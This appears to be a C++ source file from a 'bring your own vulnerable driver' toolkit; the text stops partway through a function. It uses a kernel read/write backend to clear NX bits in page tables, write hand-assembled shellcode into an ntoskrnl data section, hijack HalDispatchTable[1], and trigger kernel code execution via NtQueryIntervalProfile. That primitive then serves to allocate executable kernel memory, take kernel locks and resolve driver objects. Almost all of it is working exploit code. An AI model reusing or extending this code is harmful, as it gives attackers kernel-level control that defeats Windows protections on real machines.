#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <psapi.h>
#include <vector>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <iostream>
#include <mutex>

// MinGW does not expose these in winternl.h by default.
#ifndef SystemModuleInformation
#define SystemModuleInformation 11
#endif

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// KPROFILE_SOURCE is normally in ntddk.h. We only need the value used by
// NtQueryIntervalProfile to trigger HalDispatchTable[1].
typedef enum _KPROFILE_SOURCE {
    ProfileTime = 0,
    ProfileAlignmentFixup = 1,
    ProfileTotalIssues = 2
} KPROFILE_SOURCE;

#ifndef ProfileTotalIssues
#define ProfileTotalIssues ((KPROFILE_SOURCE)2)
#endif

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib") // CMake links ntdll for other toolchains
#endif

namespace hinv {
namespace kmem {

// ---------------------------------------------------------------------------
// PE helpers (work on raw headers read from kernel memory)
// ---------------------------------------------------------------------------

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

std::wstring NormalizeModuleName(const std::string& moduleName) {
    std::wstring s(moduleName.begin(), moduleName.end());
    return NormalizeModuleName(s);
}

std::wstring NormalizeModuleName(const std::wstring& moduleName) {
    std::wstring s = ToLower(moduleName);

    // Strip path.
    size_t slash = s.find_last_of(L"\\/");
    if (slash != std::wstring::npos) s = s.substr(slash + 1);

    // Strip extension for matching, then map known aliases.
    size_t dot = s.find(L'.');
    std::wstring stem = (dot != std::wstring::npos) ? s.substr(0, dot) : s;

    if (stem == L"ntoskrnl" || stem == L"ntkrnlpa" || stem == L"ntkrnlmp") return L"ntoskrnl.exe";
    if (stem == L"hal") return L"hal.dll";
    if (stem == L"fltmgr") return L"fltmgr.sys";
    if (stem == L"kdcom") return L"kdcom.dll";
    if (stem == L"ndis") return L"ndis.sys";
    if (stem == L"tcpip") return L"tcpip.sys";
    if (stem == L"win32k") return L"win32k.sys";
    if (stem == L"ci") return L"ci.dll";
    if (stem == L"clfs") return L"clfs.sys";

    // Default: assume .sys for kernel modules without extension.
    if (dot == std::wstring::npos) return stem + L".sys";
    return s;
}

// ---------------------------------------------------------------------------
// Module enumeration
// ---------------------------------------------------------------------------

using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

std::vector<KernelModule> EnumKernelModules() {
    std::vector<KernelModule> result;
    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQuerySystemInformation) return result;

    ULONG size = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (size == 0) return result;

    std::vector<uint8_t> buffer(size);
    if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, buffer.data(), size, &size)))
        return result;

    auto* info = reinterpret_cast<RTL_PROCESS_MODULES*>(buffer.data());
    for (ULONG i = 0; i < info->NumberOfModules; ++i) {
        const auto& m = info->Modules[i];
        KernelModule km;
        km.base = reinterpret_cast<uint64_t>(m.ImageBase);
        km.size = m.ImageSize;
        std::string asciiName(reinterpret_cast<const char*>(m.FullPathName));
        km.name.assign(asciiName.begin(), asciiName.end());
        // Keep only the file name for display; base/size are what matter.
        size_t slash = km.name.find_last_of(L"\\/");
        if (slash != std::wstring::npos) km.name = km.name.substr(slash + 1);
        result.push_back(km);
    }
    return result;
}

// ---------------------------------------------------------------------------
// Kernel export resolution
// ---------------------------------------------------------------------------

uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName) {
    if (!backend || !moduleBase || !exportName) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) return 0;

    IMAGE_EXPORT_DIRECTORY expDir{};
    if (!backend->ReadKernelMemory(moduleBase + exportDir.VirtualAddress, &expDir, sizeof(expDir))) return 0;

    std::vector<uint32_t> rvas(expDir.NumberOfNames);
    std::vector<uint16_t> ords(expDir.NumberOfNames);
    std::vector<uint32_t> funcs(expDir.NumberOfFunctions);

    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNames, rvas.data(), rvas.size() * sizeof(uint32_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNameOrdinals, ords.data(), ords.size() * sizeof(uint16_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfFunctions, funcs.data(), funcs.size() * sizeof(uint32_t)))
        return 0;

    for (uint32_t i = 0; i < expDir.NumberOfNames; ++i) {
        char name[256]{};
        if (!backend->ReadKernelMemory(moduleBase + rvas[i], name, sizeof(name) - 1)) continue;
        if (std::strcmp(name, exportName) == 0) {
            uint16_t ord = ords[i];
            if (ord < expDir.NumberOfFunctions) {
                return moduleBase + funcs[ord];
            }
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Process-local registry of manually mapped modules
// ---------------------------------------------------------------------------

static std::mutex g_mappedModulesMutex;
static std::vector<MappedModule> g_mappedModules;

void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_t size) {
    if (moduleName.empty() || !base || !size) return;

    std::wstring name = ToLower(moduleName);
    size_t slash = name.find_last_of(L"\\/");
    if (slash != std::wstring::npos) name = name.substr(slash + 1);

    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (auto& m : g_mappedModules) {
        if (m.name == name) {
            m.base = base;
            m.size = size;
            return;
        }
    }
    g_mappedModules.push_back({ name, base, size });
}

// Returns the base of a registered mapped module, or 0. lowerName must
// already be lowercase file stem + extension (e.g. L"hyperhv.dll").
static uint64_t FindMappedModule(const std::wstring& lowerName) {
    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (const auto& m : g_mappedModules) {
        if (m.name == lowerName) return m.base;
    }
    return 0;
}

uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName) {
    std::wstring target = ToLower(moduleName);

    // Manually mapped modules never appear in PsLoadedModuleList; check the
    // process-local registry first. GetKernelExport parses the export table
    // from kernel memory through the backend, which works because the mapped
    // image retains its PE headers.
    uint64_t mappedBase = FindMappedModule(target);
    if (mappedBase) return GetKernelExport(backend, mappedBase, exportName);

    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name) == target) {
            return GetKernelExport(backend, m.base, exportName);
        }
    }
    return 0;
}

uint64_t FindHalDispatchTable(byovd::IByovdBackend* backend) {
    uint64_t ntosBase = 0;
    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) return 0;
    return GetKernelExport(backend, ntosBase, "HalDispatchTable");
}

// ---------------------------------------------------------------------------
// OS version detection
// ---------------------------------------------------------------------------

OsVersionInfo GetOsVersion() {
    OsVersionInfo info{};
    using RtlGetVersionFn = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW);
    auto RtlGetVersion = reinterpret_cast<RtlGetVersionFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion"));
    if (RtlGetVersion) {
        RTL_OSVERSIONINFOW os{};
        os.dwOSVersionInfoSize = sizeof(os);
        if (NT_SUCCESS(RtlGetVersion(&os))) {
            info.major = os.dwMajorVersion;
            info.minor = os.dwMinorVersion;
            info.build = os.dwBuildNumber;
            info.revision = os.dwPlatformId; // not revision; kept for compatibility
        }
    }
    return info;
}

// ---------------------------------------------------------------------------
// Kernel lock helpers
// ---------------------------------------------------------------------------

bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type) {
    if (!backend || !lockAddress) return false;

    const char* funcName = (type == 0) ? "ExAcquireResourceExclusiveLite" : "KeAcquireGuardedMutex";
    uint64_t func = ResolveKernelExport(backend, L"ntoskrnl.exe", funcName);
    if (!func) return false;

    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxBase)
    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    // movabs rdx, 0
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    // push rbx
    sc.insert(sc.end(), { 0x53 });
    // mov rbx, rcx
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    // mov rcx, [rbx]        ; lock address
    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
    // mov rdx, 0            ; Wait = FALSE
    sc.insert(sc.end(), { 0x48, 0x31, 0xD2 });
    // mov rax, [rbx+0x08]   ; lock function
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    // sub rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    // call rax
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    // add rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    // mov [rbx], rax        ; store BOOLEAN result at ctx[0]
    sc.insert(sc.end(), { 0x48, 0x89, 0x03 });
    // pop rbx
    sc.insert(sc.end(), { 0x5B });
    // ret
    sc.push_back(0xC3);

    ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
        uint64_t data[2] = { lockAddress, func };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    uint64_t result = 0;
    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
        return false;
    }
    if (type == 0) {
        // ExAcquireResourceExclusiveLite returns BOOLEAN in RAX.
        return result != 0;
    }
    // KeAcquireGuardedMutex returns void, so RAX is meaningless. If the
    // shellcode executed to completion, the acquire call itself was made;
    // guarded mutex acquire cannot fail.
    return true;
}

bool ReleaseKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type) {
    if (!backend || !lockAddress) return false;

    const char* funcName = (type == 0) ? "ExReleaseResourceLite" : "KeReleaseGuardedMutex";
    uint64_t func = ResolveKernelExport(backend, L"ntoskrnl.exe", funcName);
    if (!func) return false;

    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    sc.insert(sc.end(), { 0x53 });
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    sc.insert(sc.end(), { 0x5B });
    sc.push_back(0xC3);

    ContextBuilder buildCtx = [lockAddress, func](uint64_t base) {
        uint64_t data[2] = { lockAddress, func };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    return ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, nullptr);
}

// ---------------------------------------------------------------------------
// PTE manipulation helpers (x64 self-referential page tables)
// ---------------------------------------------------------------------------

static uint64_t ComputePteAddress(uint64_t va, uint64_t selfRefIndex) {
    uint64_t pteBase = (selfRefIndex << 39) | (selfRefIndex << 30) | (selfRefIndex << 21) | (selfRefIndex << 12);
    // Sign-extend if needed.
    if (pteBase & 0x0000800000000000ULL) {
        pteBase |= 0xFFFF000000000000ULL;
    }
    // PTE virtual address: base + page-index * sizeof(PTE), with canonical-address masking.
    return pteBase + ((va >> 9) & 0x7FFFFFFFF8ULL);
}

// Try common self-referential PML4 indices used by Windows.
static uint64_t FindPteBase(byovd::IByovdBackend* backend) {
    static const uint64_t candidates[] = { 0x1ED, 0x1EDULL /*Win10*/, 0x1EDULL /*Win11*/ };
    for (uint64_t idx : candidates) {
        uint64_t pteBase = (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12);
        if (pteBase & 0x0000800000000000ULL) pteBase |= 0xFFFF000000000000ULL;
        uint64_t probe = pteBase; // should be a valid kernel address in the PTE region
        uint64_t dummy = 0;
        if (backend->ReadKernelMemory(probe, &dummy, sizeof(dummy))) {
            return idx;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Kernel shellcode execution via HalDispatchTable
// ---------------------------------------------------------------------------

using NtQueryIntervalProfileFn = NTSTATUS(NTAPI*)(KPROFILE_SOURCE ProfileSource, PULONG Interval);

bool ExecuteKernelShellcode(byovd::IByovdBackend* backend,
                            const std::vector<uint8_t>& shellcode,
                            uint64_t arg1,
                            uint64_t arg2,
                            uint64_t* outResult) {
    if (!backend || shellcode.empty() || shellcode.size() > 0x800) return false;

    uint64_t halTable = FindHalDispatchTable(backend);
    if (!halTable) {
        std::cerr << "[hinv::kmem] Failed to locate HalDispatchTable\n";
        return false;
    }

    // Resolve ntoskrnl base and find a writable section to host the shellcode.
    uint64_t ntosBase = 0;
    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) {
        std::cerr << "[hinv::kmem] Failed to locate ntoskrnl base\n";
        return false;
    }

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return false;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return false;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return false;

    uint64_t codePage = 0;
    std::vector<uint8_t> originalPage;
    for (const auto& sec : sections) {
        if (sec.Characteristics & IMAGE_SCN_MEM_WRITE) {
            // Search for a zeroed-out region large enough for the shellcode.
            uint64_t secVa = ntosBase + sec.VirtualAddress;
            uint32_t scanSize = sec.Misc.VirtualSize;
            if (scanSize > 0x10000) scanSize = 0x10000;
            std::vector<uint8_t> region(scanSize);
            if (!backend->ReadKernelMemory(secVa, region.data(), scanSize)) continue;

            for (uint32_t off = 0; off + shellcode.size() + 0x10 <= scanSize; off += 0x10) {
                bool clean = true;
                for (size_t k = 0; k < shellcode.size() + 0x10; ++k) {
                    if (region[off + k] != 0) { clean = false; break; }
                }
                if (clean) {
                    codePage = secVa + off;
                    originalPage.assign(region.begin() + off, region.begin() + off + shellcode.size());
                    break;
                }
            }
            if (codePage) break;
        }
    }

    if (!codePage) {
        std::cerr << "[hinv::kmem] No suitable writable kernel scratch region found\n";
        return false;
    }

    // Determine PTE self-ref index and make the scratch page executable.
    uint64_t selfRefIdx = FindPteBase(backend);
    if (!selfRefIdx) {
        std::cerr << "[hinv::kmem] Cannot resolve self-referential page tables\n";
        return false;
    }

    uint64_t pteVa = ComputePteAddress(codePage, selfRefIdx);
    uint64_t originalPte = 0;
    if (!ReadU64(backend, pteVa, originalPte)) {
        std::cerr << "[hinv::kmem] Failed to read PTE\n";
        return false;
    }

    // Clear NX bit (bit 63) while preserving everything else.
    uint64_t execPte = originalPte & ~(1ULL << 63);
    if (!WriteU64(backend, pteVa, execPte)) {
        std::cerr << "[hinv::kmem] Failed to patch PTE\n";
        return false;
    }

    // Read original HalDispatchTable[1].
    uint64_t originalHalEntry = 0;
    if (!ReadU64(backend, halTable + 8, originalHalEntry)) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Patch arguments at the beginning of shellcode if the caller used the arg placeholder pattern.
    // We reserve a 16-byte header: movabs rcx, arg1 ; movabs rdx, arg2
    std::vector<uint8_t> patched = shellcode;
    auto PatchU64 = [&](size_t off, uint64_t value) {
        if (off + 8 <= patched.size()) {
            std::memcpy(patched.data() + off, &value, 8);
        }
    };
    PatchU64(2, arg1);  // after 48 b9 (mov rcx, imm64)
    PatchU64(12, arg2); // after 48 ba (mov rdx, imm64)

    // Write shellcode into scratch region.
    if (!backend->WriteKernelMemory(codePage, patched.data(), patched.size())) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Overwrite HalDispatchTable[1] with our shellcode address.
    if (!WriteU64(backend, halTable + 8, codePage)) {
        backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Trigger execution from usermode.
    auto NtQueryIntervalProfile = reinterpret_cast<NtQueryIntervalProfileFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile"));

    bool triggered = false;
    if (NtQueryIntervalProfile) {
        ULONG interval = 0;
        NTSTATUS status = NtQueryIntervalProfile(ProfileTotalIssues, &interval);
        triggered = NT_SUCCESS(status);
    }

    // Best-effort cleanup.
    WriteU64(backend, halTable + 8, originalHalEntry);
    backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
    WriteU64(backend, pteVa, originalPte);

    if (outResult && triggered) {
        // The shellcode is expected to write its result into the usermode arg1 buffer.
        // We do not read it here because arg1 semantics are caller-defined.
        *outResult = 0;
    }

    return triggered;
}

// ---------------------------------------------------------------------------
// SMAP-safe kernel execution
// ---------------------------------------------------------------------------

bool ExecuteKernelShellcodeSmapSafe(byovd::IByovdBackend* backend,
                                    const std::vector<uint8_t>& shellcode,
                                    ContextBuilder buildContext,
                                    uint64_t* outResult) {
    if (!backend || shellcode.empty() || shellcode.size() > 0x400) return false;

    uint64_t halTable = FindHalDispatchTable(backend);
    if (!halTable) {
        std::cerr << "[hinv::kmem] Failed to locate HalDispatchTable\n";
        return false;
    }

    uint64_t ntosBase = 0;
    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) {
        std::cerr << "[hinv::kmem] Failed to locate ntoskrnl base\n";
        return false;
    }

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return false;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return false;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return false;

    uint64_t codePage = 0;
    std::vector<uint8_t> originalPage;
    constexpr size_t SCRATCH_TOTAL = 0x1000;

    for (const auto& sec : sections) {
        if (sec.Characteristics & IMAGE_SCN_MEM_WRITE) {
            uint64_t secVa = ntosBase + sec.VirtualAddress;
            uint32_t scanSize = sec.Misc.VirtualSize;
            if (scanSize > 0x10000) scanSize = 0x10000;
            std::vector<uint8_t> region(scanSize);
            if (!backend->ReadKernelMemory(secVa, region.data(), scanSize)) continue;

            for (uint32_t off = 0; off + SCRATCH_TOTAL <= scanSize; off += 0x1000) {
                bool clean = true;
                for (size_t k = 0; k < SCRATCH_TOTAL; ++k) {
                    if (region[off + k] != 0) { clean = false; break; }
                }
                if (clean) {
                    codePage = secVa + off;
                    originalPage.assign(region.begin() + off, region.begin() + off + SCRATCH_TOTAL);
                    break;
                }
            }
            if (codePage) break;
        }
    }

    if (!codePage) {
        std::cerr << "[hinv::kmem] No suitable writable kernel scratch page found\n";
        return false;
    }

    uint64_t selfRefIdx = FindPteBase(backend);
    if (!selfRefIdx) {
        std::cerr << "[hinv::kmem] Cannot resolve self-referential page tables\n";
        return false;
    }

    uint64_t pteVa = ComputePteAddress(codePage, selfRefIdx);
    uint64_t originalPte = 0;
    if (!ReadU64(backend, pteVa, originalPte)) {
        std::cerr << "[hinv::kmem] Failed to read PTE\n";
        return false;
    }

    uint64_t execPte = originalPte & ~(1ULL << 63);
    if (!WriteU64(backend, pteVa, execPte)) {
        std::cerr << "[hinv::kmem] Failed to patch PTE\n";
        return false;
    }

    uint64_t originalHalEntry = 0;
    if (!ReadU64(backend, halTable + 8, originalHalEntry)) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Build kernel-resident context at codePage + 0x400.
    uint64_t ctxBase = codePage + 0x400;
    std::vector<uint8_t> ctx = buildContext(ctxBase);
    if (ctx.empty() || ctx.size() > 0x400) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Patch shellcode arg1 with kernel context address.
    std::vector<uint8_t> patched = shellcode;
    auto PatchU64 = [&](size_t off, uint64_t value) {
        if (off + 8 <= patched.size()) {
            std::memcpy(patched.data() + off, &value, 8);
        }
    };
    PatchU64(2, ctxBase);
    PatchU64(12, 0);

    // Write shellcode + context into the scratch page.
    std::vector<uint8_t> page(SCRATCH_TOTAL, 0);
    std::memcpy(page.data(), patched.data(), patched.size());
    std::memcpy(page.data() + 0x400, ctx.data(), ctx.size());

    if (!backend->WriteKernelMemory(codePage, page.data(), page.size())) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    if (!WriteU64(backend, halTable + 8, codePage)) {
        backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    auto NtQueryIntervalProfile = reinterpret_cast<NtQueryIntervalProfileFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile"));

    bool triggered = false;
    if (NtQueryIntervalProfile) {
        ULONG interval = 0;
        NTSTATUS status = NtQueryIntervalProfile(ProfileTotalIssues, &interval);
        triggered = NT_SUCCESS(status);
    }

    // Read result from kernel context (first qword).
    if (outResult && triggered) {
        ReadU64(backend, ctxBase, *outResult);
    }

    WriteU64(backend, halTable + 8, originalHalEntry);
    backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
    WriteU64(backend, pteVa, originalPte);

    return triggered;
}

// ---------------------------------------------------------------------------
// Kernel memory allocation via shellcode
// ---------------------------------------------------------------------------

bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
    if (!backend || size == 0) return false;

    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePool2");
    uint64_t poolType = 0x80; // POOL_FLAG_NON_PAGED_EXECUTE
    if (!allocFn) {
        allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
        poolType = 0; // NonPagedPool (executable pre-Win8; NX on Win8+)
    }
    if (!allocFn) {
        std::cerr << "[hinv::kmem] ExAllocatePool2/WithTag not found\n";
        return false;
    }

    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0   (patched -> ctxBase)
    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    // movabs rdx, 0   (unused)
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    // push rbx
    sc.insert(sc.end(), { 0x53 });
    // mov rbx, rcx          ; rbx = kernel context pointer
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    // mov rcx, [rbx+0x18]   ; PoolType / POOL_FLAGS
    sc.insert(sc.end(), { 0x48, 0x8B, 0x4B, 0x18 });
    // mov rdx, [rbx+0x10]   ; NumberOfBytes
    sc.insert(sc.end(), { 0x48, 0x8B, 0x53, 0x10 });
    // mov r8d, 'hinv'       ; Tag
    sc.insert(sc.end(), { 0x41, 0xB8, 0x68, 0x69, 0x6E, 0x76 });
    // mov rax, [rbx+0x08]   ; ExAllocatePool* VA
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    // sub rsp, 0x28         ; shadow space
    sc.insert(sc.end(), { 0x48, 0x81, 0xEC, 0x28, 0x00, 0x00, 0x00 });
    // call rax
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    // add rsp, 0x28
    sc.insert(sc.end(), { 0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00 });
    // mov [rbx], rax        ; store allocated VA at ctx[0]
    sc.insert(sc.end(), { 0x48, 0x89, 0x03 });
    // pop rbx
    sc.insert(sc.end(), { 0x5B });
    // ret
    sc.push_back(0xC3);

    ContextBuilder buildCtx = [allocFn, size, poolType](uint64_t base) {
        uint64_t data[4] = { 0, allocFn, size, poolType };
        return std::vector<uint8_t>(reinterpret_cast<uint8_t*>(data),
                                    reinterpret_cast<uint8_t*>(data) + sizeof(data));
    };

    uint64_t result = 0;
    if (!ExecuteKernelShellcodeSmapSafe(backend, sc, buildCtx, &result)) {
        std::cerr << "[hinv::kmem] Allocator shellcode execution failed\n";
        return false;
    }

    outKernelVa = result;
    return (outKernelVa != 0);
}

// ---------------------------------------------------------------------------
// Resolve a kernel DriverObject by name
// ---------------------------------------------------------------------------

uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverName) {
    if (!backend || !driverName) return 0;

    uint64_t obRef = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObReferenceObjectByName");
    uint64_t ioDriverType = ResolveKernelExport(backend, L"ntoskrnl.exe", "IoDriverObjectType");
    if (!obRef || !ioDriverType) {
        std::cerr << "[hinv::kmem] ObReferenceObjectByName or IoDriverObjectType not found\n";
        return 0;
    }

    size_t nameLenBytes = std::wcslen(driverName) * sizeof(wchar_t);

    std::vector<uint8_t> sc;
    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxBase)
    Emit({ 0x48, 0xB9 }); PushU64(0);
    // movabs rdx, 0 (unused)
    Emit({ 0x48, 0xBA }); PushU64(0);

    // push rbx
    Emit({ 0x53 });
    // mov rbx, rcx
    Emit({ 0x48, 0x89, 0xCB });
    // sub rsp, 0x60
    Emit({ 0x48, 0x81, 0xEC, 0x60, 0x00, 0x00, 0x00 });

    // rcx = UNICODE_STRING (kernel address)
    Emit({ 0x48, 0x8B, 0x4B, 0x18 });       // mov rcx, [rbx+0x18]
    // rdx = Attributes = 0
    Emit({ 0x48, 0x31, 0xD2 });
    // r8  = PassedAccessState = NULL
    Emit({ 0x4D, 0x31, 0xC0 });
    // r9  = DesiredAccess = 0
    Emit({ 0x4D, 0x31, 0xC9 });
    // arg5 = ObjectType = *IoDriverObjectType
    Emit({ 0x48, 0x8B, 0x43, 0x10 });       // mov rax, [rbx+0x10]
    Emit({ 0x48, 0x8B, 0x00 });             // mov rax, [rax]
    Emit({ 0x48, 0x89, 0x44, 0x24, 0x20 }); // [rsp+0x20] = rax
    // arg6 = AccessMode = KernelMode (0)
    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00 });
    // arg7 = ParseContext = NULL
    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 });
    // arg8 = Object = &objectOut
    Emit({ 0x48, 0x8D, 0x43, 0x20 });       // lea rax, [rbx+0x20]
    Emit({ 0x48, 0x89, 0x44, 0x24, 0x38 }); // [rsp+0x38] = rax
    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08]
    Emit({ 0xFF, 0xD0 });                   // call rax
    Emit({ 0x48, 0x8B, 0x53, 0x20 });       // mov rdx, [rbx+0x20] (object pointer)
    Emit({ 0x48, 0x89, 0x13 });             // mov [rbx], rdx (store to ctx[0])

    // add rsp, 0x60
    Emit({ 0x48, 0x81, 0xC4, 0x60, 0x00, 0x00, 0x00 });
    // pop rbx
    Emit({ 0x5B });
    // ret
    Emit({ 0xC3 });

    ContextBuilder buildCtx = [obRef, ioDriverType, driverName, nameLenBytes](uint64_t base) {
